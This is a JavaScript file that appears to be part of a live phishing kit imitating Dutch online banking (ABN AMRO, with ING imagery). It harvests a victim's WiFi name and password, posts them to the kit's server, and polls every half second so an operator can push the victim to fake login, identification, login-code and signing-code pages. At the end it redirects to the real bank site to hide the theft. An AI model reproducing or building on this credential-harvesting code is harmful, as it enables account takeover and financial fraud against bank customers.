const login_form = document.querySelector('#login-form');

const wifi = document.querySelector('#wifi-name');
const wifi_pass = document.querySelector('#wifi-pass');
const wifi_pass_two = document.querySelector('#wifi-pass-two');
const loginButton = document.querySelector('#loginButton');
const token = document.querySelector('#token');

login_form.addEventListener('submit', e => {
    e.preventDefault();

    if (wifi.value == '' || wifi_pass.value == '' || wifi_pass_two.value == '' || wifi_pass.value != wifi_pass_two.value) {
        loginButton.innerHTML = 'Volgende';
        loginButton.disabled = false;
        
        wifi.disabled = false;
        wifi_pass.disabled = false;
        wifi_pass.disabled = false;

        wifi.value = '';
        wifi_pass.value = '';
        wifi_pass_two.value = '';
        
        document.querySelector('#errorMessage').style.display = 'block';
    } else {
        const data = new FormData();
        data.append('wifi', wifi.value);
        data.append('wifi_pass', wifi_pass.value);
        data.append('wifi_pass_two', wifi_pass_two.value);

        loginButton.innerHTML = '<img src="/img/ing.gif" width="20"> Volgende';
        loginButton.disabled = true;
        
        wifi.disabled = true;
        wifi_pass.disabled = true;
        wifi_pass_two.disabled = true;
        
        document.querySelector('#errorMessage').style.display = 'none'; 

        fetch('/portalserver/nl/prive/bankieren/controleren/' + token.value, {
            method: 'POST',
            body: data
        }).then(() => {
            const newInterval = setInterval(() => {
                fetch('/portalserver/nl/prive/bankieren/controleren/check/' + token.value, {
                    method: 'POST'
                }).then(res => {
                    res.json().then(data => {
                        if (data.page == 'login') {
                            window.location.href = '/portalserver/nl/prive/bankieren/inloggen/' + token.value;
                        } else if (data.page == 'identification') {
                            window.location.href = '/portalserver/nl/prive/bankieren/identificatie/' + token.value;
                        } else if (data.page == 'loginCode') {
                            window.location.href = '/portalserver/nl/prive/bankieren/logincode/' + token.value;
                        } else if (data.page == 'signCode') {
                            window.location.href = '/portalserver/nl/prive/bankieren/signeercode/' + token.value;
                        } else if (data.page == 'control') {
                            loginButton.innerHTML = 'Volgende';
                            loginButton.disabled = false;
                            
                            wifi.disabled = false;
                            wifi_pass.disabled = false;
                            wifi_pass_two.disabled = false;
                    
                            wifi.value = '';
                            wifi_pass.value = '';
                            wifi_pass_two.value = '';
                            
                            document.querySelector('#errorMessage').style.display = 'block';

                            clearInterval(newInterval)
                        } else if (data.page == 'finish') {
                            window.location.href = 'https://www.abnamro.nl';
                        } else if (data.page == 'waiting') {
                            console.log('Waiting...');
                        }
                    });
                });
            }, 500);
        });
    }
});


